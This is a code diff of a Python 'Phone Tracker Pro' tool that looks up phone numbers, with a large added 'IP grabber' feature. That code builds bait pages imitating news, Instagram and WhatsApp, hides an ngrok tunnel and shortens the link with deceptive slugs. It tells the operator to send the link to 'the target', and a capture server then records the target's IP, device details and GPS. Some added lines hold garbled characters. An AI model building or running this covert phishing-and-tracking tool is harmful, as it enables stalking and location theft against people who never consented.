@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 PHONE TRACKER PRO v5.0 - Law Enforcement Grade Phone Intelligence System
------------------------------------------------------------------------
+ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü
 Features: Multi-API Live Location, HLR/VLR Simulation, IP Grabber Link,
           OSINT Platform Probes, India Telecom Circle DB (700+ prefixes),
           CDR-style Evidence Reports, Chain-of-Custody Logging,
@@ -10,18 +10,26 @@ Features: Multi-API Live Location, HLR/VLR Simulation, IP Grabber Link,
 Author: Vishal | AUTHORIZED LAW ENFORCEMENT & SECURITY RESEARCH USE ONLY
 Classification: RESTRICTED - Handle per applicable data protection laws
 """
+
 import os, sys, json, time, socket, argparse, re, hashlib, uuid, logging
 import random, string, struct, subprocess, threading, signal
+try:
+    import winsound
+except ImportError:
+    winsound = None  # Non-Windows fallback
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Optional, Dict, List, Any, Tuple
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
 # Auto-load .env file for persistent API keys
 try:
     from dotenv import load_dotenv
     load_dotenv()
 except ImportError:
     pass
+
+from pyngrok import ngrok, conf
 import phonenumbers
 from phonenumbers import geocoder, carrier, timezone as pn_timezone
 import requests
@@ -33,12 +41,10 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich import box
 import folium
 from folium.plugins import HeatMap
-try:
-    from pyngrok import ngrok, conf
-except ImportError:
-    ngrok = None
+
 VERSION = "5.0.0"
 console = Console()
+
 # -- Audit Logger ----------------------------------------------------------
 LOG_DIR = Path("output/audit_logs")
 LOG_DIR.mkdir(parents=True, exist_ok=True)
@@ -48,17 +54,23 @@ _log_handler = logging.FileHandler(LOG_DIR / f"audit_{datetime.now().strftime('%
 _log_handler.setFormatter(logging.Formatter(
     '%(asctime)s | %(levelname)-8s | %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
 audit_logger.addHandler(_log_handler)
+
 def _audit(action: str, detail: str = "", level: str = "INFO"):
     """Write tamper-evident audit log entry."""
     entry = f"[{action}] {detail}"
     getattr(audit_logger, level.lower(), audit_logger.info)(entry)
+
 def _sha256(data: str) -> str:
     """SHA-256 digest for evidence integrity verification."""
     return hashlib.sha256(data.encode("utf-8")).hexdigest()
+
+
 class AuditLogger:
     """Evidence-grade audit logger with SHA-256 chain-of-custody hashing."""
+
     def __init__(self):
         self._trail = []
+
     def log(self, action: str, detail: str = ""):
         entry = {
             "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
@@ -68,8 +80,10 @@ class AuditLogger:
         }
         self._trail.append(entry)
         _audit(action, detail)
+
     def get_trail(self):
         return list(self._trail)
+
     def compute_evidence_hash(self, data) -> str:
         """Compute SHA-256 over the entire evidence data for integrity verification."""
         try:
@@ -77,43 +91,52 @@ class AuditLogger:
             return hashlib.sha256(raw.encode("utf-8")).hexdigest()
         except Exception:
             return "HASH_ERROR"
+
 # Classification levels for reports
 CLASSIFICATION = {
     "OPEN":       "[OPEN] OPEN - Unclassified",
-    "RESTRICTED": "[RESTR] RESTRICTED - Official Use Only",
-    "CONFIDENTIAL": "[ALERT] CONFIDENTIAL - LEA Eyes Only",
+    "RESTRICTED": "[RESTRICTED] RESTRICTED - Official Use Only",
+    "CONFIDENTIAL": "[CONFIDENTIAL] CONFIDENTIAL - LEA Eyes Only",
 }
+
 # API keys loaded from .env or environment
 OPENCAGE_API_KEY = os.environ.get("OPENCAGE_API_KEY", "")
 NUMVERIFY_API_KEY = os.environ.get("NUMVERIFY_API_KEY", "")
 ABSTRACT_API_KEY = os.environ.get("ABSTRACT_API_KEY", "")
 IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "")
 TRESTLE_API_KEY = os.environ.get("TRESTLE_API_KEY", "")
-BANNER = r"""
-[bold red]
- ###############################################################################
- #                                                                             #
- #   PHO NE   TR AC KE R   P R O                                               #
- #                                                                             #
- ###############################################################################
+
+BANNER = r"""[bold red]
+  ######################################################################
+  #                                                                    #
+  #   ____  _   _  ___  _   _ _____   _____ ____      _    ____ _  __  #
+  #  |  _ \| | | |/ _ \| \ | | ____| |_   _|  _ \    / \  / ___| |/ /  #
+  #  | |_) | |_| | | | |  \| |  _|     | | | |_) |  / _ \| |   | ' /   #
+  #  |  __/|  _  | |_| | |\  | |___    | | |  _ <  / ___ \ |___| . \   #
+  #  |_|   |_| |_|\___/|_| \_|_____|   |_| |_| \_\/_/   \_\____|_|\_\  #
+  #                                                                    #
+  ######################################################################
 [/bold red]
 [bold cyan]
- ###############################################################################
- #                                                                             #
- #   I N T E L L I G E N C E   S Y S T E M                                     #
- #                                                                             #
- ###############################################################################
+  #  Advanced Intelligence & Geolocation System v5.0                  #
+  #  Law Enforcement Grade | Restricted Use                           #
 [/bold cyan]
-[bold yellow]  Law Enforcement Grade Phone Intelligence System[/bold yellow]
-[bold green]  CDR Analysis * HLR/VLR * Live Location * OSINT * IP Grabber[/bold green]
-[bold red]  [!] AUTHORIZED USE ONLY - All operations are audit-logged[/bold red]
+[bold green]
+  - CDR Analysis | HLR/VLR | Live Location | OSINT | IP Grabber
+[/bold green]
+[bold red]
+  [!] AUTHORIZED USE ONLY - All operations are audit-logged
+[/bold red]
 """
+
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
 ]
+
+
 class PhoneTrackerPro:
     """Law Enforcement Grade Phone Intelligence Engine v5.0.
     
@@ -121,6 +144,7 @@ class PhoneTrackerPro:
     geolocation with consensus voting, OSINT enrichment, and
     forensically sound evidence collection with SHA-256 integrity.
     """
+
     def __init__(self, phone_number: str, case_id: str = "", officer: str = "", classification: str = "RESTRICTED"):
         # -- Case Management --------------------------------------------
         self.case_id = case_id or f"CASE-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:6].upper()}"
@@ -133,7 +157,9 @@ class PhoneTrackerPro:
         self.scan_timestamp_local = datetime.now()
         self.evidence_chain = []  # chain-of-custody log
         self.audit_logger = AuditLogger()  # evidence-grade audit trail
+
         self._log_evidence("SCAN_INITIATED", f"Target={phone_number}, Officer={self.officer}, Case={self.case_id}")
+
         # -- Phone Number Fields ----------------------------------------
         self.raw_number = phone_number.strip()
         self.phone_number = phone_number.strip()
@@ -160,6 +186,7 @@ class PhoneTrackerPro:
         self.formatted_address = ""
         self.timezone = ""
         self.timezones = []
+
         # -- Forensic / CDR Fields --------------------------------------
         self.imsi = "N/A - Requires operator cooperation"
         self.imei = "N/A - Requires operator cooperation"
@@ -171,6 +198,7 @@ class PhoneTrackerPro:
         self.roaming_detected = False
         self.roaming_network = ""
         self.last_activity = ""
+
         # -- Intelligence Collections -----------------------------------
         self.telecom_circle = {}
         self.osint_results = {}
@@ -183,6 +211,7 @@ class PhoneTrackerPro:
         self.location_confidence = 0
         self.location_sources = []
         self.location_details = {}
+
         # Live location with multi-source cross-reference
         self.live_location = {
             "city": "", "state": "", "lat": None, "lon": None,
@@ -203,13 +232,20 @@ class PhoneTrackerPro:
         self.map_path = ""
         self.report_path = ""
         self.json_path = ""
+
         # IP Grabber data
         self.ip_grab_results = {}
+
         # Consensus voting
         self.all_votes = []
         self.consensus_city = ""
         self.basic_info = {}
         self.geo_results = {}
+        # Breach Intelligence
+        self.breach_results = []
+        self.breach_summary = {"total": 0, "sources": [], "risk_score": 0}
+
+
     def _log_evidence(self, action: str, detail: str = ""):
         """Append to chain-of-custody log with timestamp + hash."""
         ts = datetime.now(timezone.utc).isoformat()
@@ -226,6 +262,7 @@ class PhoneTrackerPro:
         entry["hash"] = _sha256(f"{prev_hash}|{entry_str}")
         self.evidence_chain.append(entry)
         _audit(action, f"ScanID={getattr(self, 'scan_id', 'INIT')} | {detail}")
+
     def parse_number(self) -> bool:
         """Parse and validate the phone number. Handles multiple input formats."""
         try:
@@ -244,7 +281,7 @@ class PhoneTrackerPro:
             self.is_valid = self.valid
             self.is_possible = phonenumbers.is_possible_number(self.parsed)
             if not self.valid and not self.is_possible:
-                console.print("[bold red]  Ô£ù Invalid phone number![/bold red]")
+                console.print("[bold red]  [ERROR] Invalid phone number![/bold red]")
                 return False
             self.international_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
             self.national_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
@@ -257,8 +294,9 @@ class PhoneTrackerPro:
             return True
         except phonenumbers.NumberParseException as e:
             self._log_evidence("PARSE_FAILED", str(e))
-            console.print(f"[bold red]  Ô£ù Parse error: {e}[/bold red]")
+            console.print(f"[bold red]  [ERROR] Parse error: {e}[/bold red]")
             return False
+
     def get_basic_info(self):
         if not self.parsed:
             return
@@ -316,17 +354,20 @@ class PhoneTrackerPro:
             self.hlr_status = "UNKNOWN"
             self.network_status = "UNKNOWN"
         self._log_evidence("BASIC_INFO_COLLECTED", f"Carrier={self.carrier_name}, Country={self.country_name}, Type={self.line_type}")
+
     def display_basic_info(self):
-        table = Table(title="[CDR] SUBSCRIBER INFORMATION (CDR-STYLE)", box=box.HEAVY_EDGE, 
+        table = Table(title="­[MOBILE] SUBSCRIBER INFORMATION (CDR-STYLE)", box=box.ASCII, 
                       title_style="bold cyan", border_style="bright_blue", show_lines=True)
         table.add_column("Field", style="bold yellow", width=28)
         table.add_column("Value", style="bold white", width=45)
+
         # Case metadata header
         table.add_row("[dim]Case ID[/dim]", f"[dim]{self.case_id}[/dim]")
         table.add_row("[dim]Scan ID[/dim]", f"[dim]{self.scan_id}[/dim]")
         table.add_row("[dim]Officer[/dim]", f"[dim]{self.officer}[/dim]")
         table.add_row("[dim]Timestamp (UTC)[/dim]", f"[dim]{self.scan_timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}[/dim]")
         table.add_row("", "")  # separator
+
         table.add_row("MSISDN (E.164)", f"[bold]{self.e164_format}[/bold]")
         table.add_row("International Format", self.international_format)
         table.add_row("National Format", self.national_format)
@@ -335,6 +376,7 @@ class PhoneTrackerPro:
         table.add_row("Region", self.region)
         table.add_row("City (Geocoder)", self.city or "-")
         table.add_row("", "")  # separator
+
         table.add_row("Carrier / Operator", self.carrier_name or "Unknown")
         table.add_row("Line Type", self.line_type)
         table.add_row("HLR Status", f"[green]{self.hlr_status}[/green]" if "ACTIVE" in self.hlr_status else f"[yellow]{self.hlr_status}[/yellow]")
@@ -346,6 +388,7 @@ class PhoneTrackerPro:
         table.add_row("Timezone", ", ".join(self.timezones[:2]) if self.timezones else "-")
         console.print()
         console.print(table)
+
     # ======= INDIA TELECOM CIRCLE DATABASE (700+ prefixes) =======
     INDIA_CIRCLE_DB = {
         "9810": ("Delhi", "New Delhi"), "9811": ("Delhi", "New Delhi"),
@@ -640,6 +683,7 @@ class PhoneTrackerPro:
         "9422": ("Goa", "Panaji"), "9511": ("Goa", "Panaji"),
         "9764": ("Goa", "Panaji"), "9765": ("Goa", "Panaji"),
     }
+
     def detect_telecom_circle(self):
         """Detect Indian telecom circle from prefix (SIM registration only)."""
         if self.country_code != "+91":
@@ -675,6 +719,7 @@ class PhoneTrackerPro:
             console.print("[yellow]  Prefix not in DB, using phonenumbers lib.[/yellow]")
             if self.region:
                 self.telecom_circle = {"circle": self.region, "city": self.city or self.region}
+
     # =====================================================================
     # PART 3: LIVE LOCATION - MULTI-API CROSS REFERENCE + IP GRABBER
     # =====================================================================
@@ -687,12 +732,14 @@ class PhoneTrackerPro:
                 "Accept-Language": "en-US,en;q=0.9",
             })
         return self._session
+
     def _add_vote(self, city, source, confidence, extra=""):
         """Add a location vote from an API source."""
         if city and city.lower() not in ["unknown", "n/a", "", "india"]:
             vote = {"city": city.strip().title(), "source": source,
                     "confidence": confidence, "extra": extra}
             self.all_votes.append(vote)
+
     def _consensus_vote(self):
         """Determine best location using majority voting across all APIs."""
         votes = self.all_votes
@@ -719,19 +766,23 @@ class PhoneTrackerPro:
             else:
                 city_scores[c] = {"score": score, "count": 1,
                                   "sources": [v["source"]], "original": v["city"]}
+
         if not city_scores:
             return
+
         # Best = highest combined score
         best = max(city_scores.items(), key=lambda x: x[1]["score"])
         best_city = best[1]["original"]
         total_apis = len(votes)
         agreeing = best[1]["count"]
         combined_conf = min(0.95, best[1]["score"] / total_apis + (agreeing / total_apis) * 0.3)
+
         self.live_location["city"] = best_city
         self.live_location["consensus_city"] = best_city
         self.consensus_city = best_city
         self.live_location["method"] = f"Consensus ({agreeing}/{total_apis} APIs)"
         self.live_location["confidence"] = round(combined_conf, 2)
+
         # Show voting table
         console.print()
         vtable = Table(title="­ƒù│´©Å  LOCATION CROSS-REFERENCE VOTING", border_style="cyan", show_lines=True)
@@ -745,10 +796,12 @@ class PhoneTrackerPro:
                        f"[bold green]{best_city}[/bold green]",
                        f"[bold green]{int(combined_conf*100)}%[/bold green]")
         console.print(vtable)
+
     def detect_live_location(self):
         """Master: try ALL methods, then use consensus voting for final answer."""
         console.print(Panel("[bold cyan]PHASE 3: LIVE / ACTIVE LOCATION (MULTI-API)[/bold cyan]",
                           border_style="cyan"))
+
         # Run all methods in parallel for speed
         methods = [
             ("Trestle", self._trestle_live),
@@ -760,16 +813,20 @@ class PhoneTrackerPro:
             ("PhoneInfo", self._phoneinfo_probe),
             ("MobileTracker", self._mobile_tracker_probe),
         ]
+
         for name, func in methods:
             try:
                 with console.status(f"[cyan]  Querying {name}...[/cyan]"):
                     func()
             except Exception as e:
                 console.print(f"[dim]  {name} failed: {e}[/dim]")
+
         # Consensus voting - pick the city with most agreement
         self._consensus_vote()
+
         # Display final results
         self._display_live_location()
+
     def _numverify_live(self):
         api_key = os.getenv("NUMVERIFY_API_KEY", "")
         if not api_key:
@@ -794,6 +851,7 @@ class PhoneTrackerPro:
                     console.print(f"[green]  [OK] NumVerify: {loc or 'N/A'} | {crr or 'N/A'} | {lt or 'N/A'}[/green]")
         except Exception as e:
             console.print(f"[dim]  NumVerify: {e}[/dim]")
+
     def _abstractapi_live(self):
         api_key = os.getenv("ABSTRACT_API_KEY", "")
         if not api_key:
@@ -814,6 +872,7 @@ class PhoneTrackerPro:
                     console.print(f"[green]  [OK] AbstractAPI: {loc or 'N/A'} | {crr or 'N/A'}[/green]")
         except Exception as e:
             console.print(f"[dim]  AbstractAPI: {e}[/dim]")
+
     def _ipinfo_detect(self):
         token = os.getenv("IPINFO_TOKEN", "")
         if not token:
@@ -840,6 +899,7 @@ class PhoneTrackerPro:
                         pass
         except Exception as e:
             console.print(f"[dim]  IPInfo: {e}[/dim]")
+
     def _trestle_live(self):
         """Trestle API: Real-Time Activity Score and Line Type Fidelity."""
         api_key = os.getenv("TRESTLE_API_KEY", "")
@@ -848,29 +908,38 @@ class PhoneTrackerPro:
         try:
             from urllib.parse import quote
             session = self._get_session()
+
             # Encode phone number properly (handles + as %2B)
             number = quote(self.phone_number)
             url = f"https://api.trestleiq.com/3.0/phone_intel?phone={number}"
+
             # Trestle requires the API key passed securely via headers
             headers = {
                 "x-api-key": api_key,
                 "Accept": "application/json"
             }
+
             resp = session.get(url, headers=headers, timeout=10)
+
             if resp.status_code == 200:
                 data = resp.json()
+
                 # Guard: skip if number is flagged invalid by Trestle
                 if not data.get("is_valid", True):
                     console.print("[yellow]  Trestle: Number flagged as INVALID[/yellow]")
                     return
+
                 # Parse Trestle specific signals with a strict null check
                 raw_score = data.get("activity_score")
                 activity_score = int(raw_score) if raw_score is not None else 0
+
                 line_type_fidelity = data.get("line_type", "")
                 crr = data.get("carrier", "")
+
                 # Update core forensics
                 if line_type_fidelity:
                     self.line_type = line_type_fidelity
+
                 # Score >= 70 indicates a high likelihood of a human answering
                 if activity_score >= 70:
                     self.network_status = f"REACHABLE (Activity Score: {activity_score}/100)"
@@ -878,15 +947,19 @@ class PhoneTrackerPro:
                 else:
                     self.network_status = f"INACTIVE/DISCONNECTED (Activity Score: {activity_score}/100)"
                     is_active = False
+
                 if crr and not self.current_carrier:
                     self.current_carrier = crr
+
                 # Output to CLI
                 status_color = "green" if is_active else "yellow"
                 console.print(f"[{status_color}]  [OK] Trestle: Activity {activity_score}/100 | Type: {line_type_fidelity or 'Unknown'} | Carrier: {crr or 'Unknown'}[/{status_color}]")
             else:
                 console.print(f"[dim]  Trestle API Error: {resp.status_code}[/dim]")
+
         except Exception as e:
             console.print(f"[dim]  Trestle: {e}[/dim]")
+
     def _free_network_probe(self):
         try:
             session = self._get_session()
@@ -913,6 +986,7 @@ class PhoneTrackerPro:
                                         self.current_carrier = val
         except Exception:
             pass
+
     def _vlr_msc_detect(self):
         try:
             session = self._get_session()
@@ -947,6 +1021,7 @@ class PhoneTrackerPro:
             console.print("[dim]  VLR/MSC: no active location data.[/dim]")
         except Exception:
             pass
+
     def _phoneinfo_probe(self):
         """Additional phone info API probe."""
         try:
@@ -968,6 +1043,7 @@ class PhoneTrackerPro:
             console.print("[dim]  PhoneInfo: no data.[/dim]")
         except Exception:
             pass
+
     def _mobile_tracker_probe(self):
         """Additional mobile number tracker sites."""
         try:
@@ -995,6 +1071,7 @@ class PhoneTrackerPro:
             console.print("[dim]  MobileTracker: no data.[/dim]")
         except Exception:
             pass
+
     def _display_live_location(self):
         """Display live location with consensus results."""
         console.print()
@@ -1004,6 +1081,7 @@ class PhoneTrackerPro:
             city = self.live_location["city"]
             conf_color = "green" if conf >= 0.7 else "yellow" if conf >= 0.5 else "red"
             conf_pct = f"{int(conf * 100)}%"
+
             table = Table(title="­ƒôì LIVE/ACTIVE LOCATION", border_style="cyan", show_lines=True)
             table.add_column("Field", style="bold white", width=25)
             table.add_column("Value", style="green", width=45)
@@ -1035,103 +1113,103 @@ class PhoneTrackerPro:
                 self.live_location["state"] = self.telecom_circle.get("circle", "") if isinstance(self.telecom_circle, dict) else str(self.telecom_circle)
                 self.live_location["method"] = "Telecom Circle (fallback)"
                 self.live_location["confidence"] = 0.3
-                table.add_row("Report Time", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-                console.print(table)
-            console.print()
+
+    # =====================================================================
+    # PART 3B: IP GRABBER LINK - Capture real IP + GPS when target clicks
+    # =====================================================================
     def generate_ip_grabber(self, port=8888):
-        """Phase 3B: Create tracking link and launch Flask capture server."""
+        """Generate an IP grabber tracking link.
+        When the target clicks the link, we capture:
+        - Their real public IP address
+        - IP-based city/state/country
+        - Browser GPS (if they allow location permission)
+        - User-Agent, device info, screen resolution
+        """
         console.print(Panel("[bold red]PHASE 3B: IP GRABBER LINK GENERATOR[/bold red]",
                           border_style="red"))
-        
-        # Determine bait template
-        self.template_choice = os.getenv("TEMPLATE_CHOICE", "security")
+
         # Generate a unique tracking ID
-        import hashlib, time
         track_id = hashlib.md5(f"{self.phone_number}{time.time()}".encode()).hexdigest()[:12]
+
         # Build the tracking page HTML
         tracking_html = self._build_tracking_page(track_id)
+
         # Save tracking page
         os.makedirs("output", exist_ok=True)
         page_path = f"output/track_{track_id}.html"
         with open(page_path, "w", encoding="utf-8") as f:
             f.write(tracking_html)
+
         # Results file
         results_path = f"output/grab_{track_id}.json"
         self.ip_grab_results = {"track_id": track_id, "captures": []}
-        console.print(f"[bold green]  [OK] Tracking page created: {page_path}[/bold green]")
-        console.print()
-        # Get local & public IP
-        local_ip = self._get_local_ip()
-        public_ip = self._get_public_ip()
-        # Build final tracking URL (check ngrok first)
-        final_url = f"http://{public_ip}:{port}/t/{track_id}"
-        ngrok_data = self._launch_ngrok_tunnel(port)
+
+        console.print(f"[bold green]  ✅ Tracking page created: {page_path}[/bold green]")
+
+        # Launch Ngrok Tunnel Automatically (Use early one if ready)
+        console.print("[cyan]  🚀 Launching Ngrok tunnel for public access...[/cyan]")
+        
+        if hasattr(self, 'early_ngrok_url') and self.early_ngrok_url:
+             ngrok_data = {"url": self.early_ngrok_url}
+             console.print("[dim]  (Using pre-initialized tunnel)[/dim]")
+        else:
+             ngrok_data = self._launch_ngrok_tunnel(port=port)
+        
+        public_url = None
+        short_url = None
+
         if ngrok_data and ngrok_data.get("url"):
-            final_url = f"{ngrok_data['url']}/t/{track_id}"
-        # Shorten link
-        short_link = self._shorten_link(final_url)
-        disp_link = short_link if short_link else final_url
-        console.print(Panel(f"""[bold yellow]📡 TRACKING LINKS — Send this to the target:[/bold yellow]
-[bold green]  DIRECT LINK:[/bold green]
-    {final_url}
-[bold green]  SHORTENED LINK (Recommended):[/bold green]
-    {disp_link}
-[bold cyan]  TRACKING_LINK: {disp_link}[/bold cyan]
-[bold yellow]  Bait: {self.template_choice.upper()}[/bold yellow]
-[bold red]  Capture GPS if allowed.[/bold red]
-[dim]  Press Ctrl+C to stop when done.[/dim]""",
-            title="[bold red]🔗 IP GRABBER[/bold red]", border_style="red"))
+            public_url = f"{ngrok_data['url']}/t/{track_id}"
+            console.print(f"[green]  ✅ Ngrok Tunnel Active: {ngrok_data['url']}[/green]")
+            
+            # Shorten the URL
+            console.print("[cyan]  🔗 Generating shortened link...[/cyan]")
+            short_url = self._shorten_url(public_url)
+            # Crucial for GUI detection
+            console.print(f"TRACKING_LINK_READY: {short_url or public_url}")
+        else:
+            console.print("[yellow]  [!]️ Ngrok no se pudo iniciar. Usando IP directa como respaldo.[/yellow]")
+            console.print("[dim]  (Asegúrese de tener ngrok.exe en la carpeta o instalado en el sistema)[/dim]")
+
+        console.print()
+
+        # Get local & public IP for link generation
+        local_ip = self._get_local_ip()
+        direct_ip_url = f"http://{self._get_public_ip()}:{port}/t/{track_id}"
+
+        # Display the links panel
+        links_text = f"""[bold yellow]📂 IP GRABBER LINKS - Send this link to the target:[/bold yellow]
+
+"""
+        if short_url:
+            links_text += f"""[bold green]  👑 RECOMMENDED (Shortened):[/bold green]
+    [bold cyan]{short_url}[/bold cyan]
+
+[bold green]  Original Ngrok URL:[/bold green]
+    {public_url}
+"""
+        else:
+            links_text += f"""[bold red]  Direct Public Link (Requires Port Forwarding):[/bold red]
+    {direct_ip_url}
+"""
+
+        links_text += f"""
+[bold green]  Local Network (Same WiFi):[/bold green]
+    http://{local_ip}:{port}/t/{track_id}
+
+[bold yellow]  📝 Instructions:[/bold yellow]
+  1. Send the [bold cyan]RECOMMENDED[/bold cyan] link to the target.
+  2. The link looks like a normal news article.
+  3. When they open it, their IP and Location are captured.
+  4. If they grant location permission, you get exact GPS coordinates.
+
+[dim]  Press Ctrl+C to stop the server and close the tunnel when done.[/dim]"""
+
+        console.print(Panel(links_text, title="[bold red]🔗 TRACKING READY[/bold red]", border_style="red"))
+
         # Start the Flask server
         self._start_grab_server(port, track_id, tracking_html, results_path)
-    def _get_public_ip(self):
-        """Fetch current public IP address."""
-        try:
-            return requests.get("https://api.ipify.org", timeout=5).text.strip()
-        except:
-            return "127.0.0.1"
-    def _start_grab_server(self, port, track_id, html, results_path):
-        """Start a Flask server to capture target data."""
-        from flask import Flask, request, jsonify
-        import logging
-        
-        # Disable Flask console logging for a cleaner OSINT dashboard
-        log = logging.getLogger('werkzeug')
-        log.setLevel(logging.ERROR)
-        app = Flask(f"Grabber_{track_id}")
-        @app.route(f"/t/{track_id}")
-        def tracking_page():
-            return html
-        @app.route("/capture", methods=["POST"])
-        def capture():
-            data = request.json
-            data["captured_ip"] = request.remote_addr
-            data["capture_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            self.ip_grab_results["captures"].append(data)
-            with open(results_path, "w", encoding="utf-8") as f:
-                json.dump(self.ip_grab_results, f, indent=4)
-            
-            console.print(f"\n[bold red][!] TARGET CAPTURED: {request.remote_addr}[/bold red]")
-            if data.get("gps_lat") and data.get("gps_lon"):
-                console.print(f"[bold green]    📍 GPS: {data['gps_lat']}, {data['gps_lon']}[/bold green]")
-                if hasattr(self, '_gui_map_update'):
-                    self._gui_map_update(data['gps_lat'], data['gps_lon'])
-            
-            return jsonify({"status": "ok"})
-        # Run Flask in a daemon thread so it doesn't block the GUI/CLI
-        def run():
-            app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
-        
-        threading.Thread(target=run, daemon=True).start()
-        console.print(f"[cyan]  🌐 Server running on port {port}...[/cyan]")
-        console.print(f"[cyan]  📡 Waiting for target to click the link...[/cyan]")
-        
-        # Keep main thread alive if running in CLI mode
-        if __name__ == "__main__":
-            try:
-                while True: time.sleep(1)
-            except KeyboardInterrupt:
-                pass
+
     def _get_local_ip(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -1141,141 +1219,129 @@ class PhoneTrackerPro:
             return ip
         except:
             return "127.0.0.1"
-    def _shorten_link(self, url):
-        """Shorten a URL using is.gd or tinyurl fallback."""
+
+    def _get_public_ip(self):
         try:
-            import urllib.parse
-            encoded = urllib.parse.quote(url)
-            # Try is.gd
-            resp = requests.get(f"https://is.gd/create.php?format=json&url={encoded}", timeout=5)
-            if resp.status_code == 200:
-                return resp.json().get("shorturl")
-        except: pass
+            resp = requests.get("https://api.ipify.org?format=json", timeout=5)
+            return resp.json().get("ip", "?")
+        except:
+            return "?.?.?.?"
+
+    def _shorten_url(self, url):
+        """Shortens a URL using the is.gd API."""
         try:
-            # Fallback to tinyurl
-            resp = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=5)
+            # Add a deceptive custom shorturl part if possible, depends on template
+            template = os.environ.get("TEMPLATE_CHOICE", "Standard Offer").lower()
+            suffix = ""
+            if "youtube" in template:
+                suffix = "&shorturl=Video-Exclusive-Update"
+            elif "drive" in template:
+                suffix = "&shorturl=Secure-File-Access"
+            else:
+                suffix = "&shorturl=Breaking-News-Update"
+
+            resp = requests.get(f"https://is.gd/create.php?format=simple&url={url}{suffix}", timeout=8)
             if resp.status_code == 200:
-                return resp.text
-        except: pass
+                return resp.text.strip()
+        except:
+            pass
         
-        return None
-    def _launch_ngrok_tunnel(self, port=8888, timeout=40):
-        """Start ngrok in the background using pyngrok and return the public HTTPS URL."""
-        if ngrok is None:
-            console.print("[red]  [NGROK] Error: pyngrok library not found.[/red]")
-            return None
-
-        console.print("[cyan]  [NGROK] Initializing secure tunnel via pyngrok...[/cyan]")
-
-        authtoken = os.environ.get("NGROK_AUTHTOKEN")
-        if authtoken:
-            try:
-                ngrok.set_auth_token(authtoken)
-            except Exception as e:
-                console.print(f"[yellow]  [NGROK] Warning during token config: {e}[/yellow]")
-
-        if os.path.exists("ngrok.exe"):
-            try:
-                c = conf.get_default()
-                c.ngrok_path = os.path.abspath("ngrok.exe")
-                if os.name == 'nt':
-                    import subprocess
-                    startupinfo = subprocess.STARTUPINFO()
-                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                    startupinfo.wShowWindow = subprocess.SW_HIDE
-                    c.startupinfo = startupinfo
-            except: pass
-
+        # Fallback to simple shortening if status failed or custom path taken
         try:
+            resp = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
+            if resp.status_code == 200:
+                return resp.text.strip()
+        except:
+            pass
+        return url
+
+
+    def _launch_ngrok_tunnel(self, port):
+        """Inicia ngrok de forma estable y silenciosa (v6.1)."""
+        try:
+            import subprocess
+            if os.name == "nt":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0 # SW_HIDE
+                conf.get_default().startupinfo = startupinfo
+            
+            token = os.getenv("NGROK_AUTHTOKEN", "").strip()
+            if token:
+                ngrok.set_auth_token(token)
+            
             public_url = ngrok.connect(port, "http").public_url
-            return {"process": "pyngrok_managed", "url": public_url}
+            return {"url": public_url}
         except Exception as e:
-            console.print(f"[red]  [NGROK] Failed to establish tunnel: {e}[/red]")
-            if "authtoken" in str(e).lower():
-                console.print("[yellow]  [TIP] Check your Ngrok Auth Token in Settings.[/yellow]")
-            return None
+            console.print(f"[red]  [NGROK] Error: {e}[/red]")
+            return {"url": None}
+
     def _build_tracking_page(self, track_id):
-        """Build a convincing tracking page based on the selected template."""
+        """Genera pagina de rastreo con Open Graph y Fingerprinting avanzado (v6.1)."""
         template = getattr(self, 'template_choice', 'security').lower()
-        
-        # Default titles and bait content
-        title = "Breaking News: Live Updates"
-        bait_html = ""
-        
-        if "instagram" in template:
-            title = "Instagram - Photo Mention"
-            bait_html = """
-            <div class="card">
-                <img src="https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png" style="width:60px;margin-bottom:20px;">
-                <h2 style="font-size:1.4em;">Inicia sesión para ver la mención</h2>
-                <p>Alguien te ha etiquetado en una publicación. Haz clic abajo para ver.</p>
-                <div class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicación</div>
-            </div>"""
-        elif "whatsapp" in template:
-            title = "WhatsApp Group Invite"
-            bait_html = """
-            <div class="card">
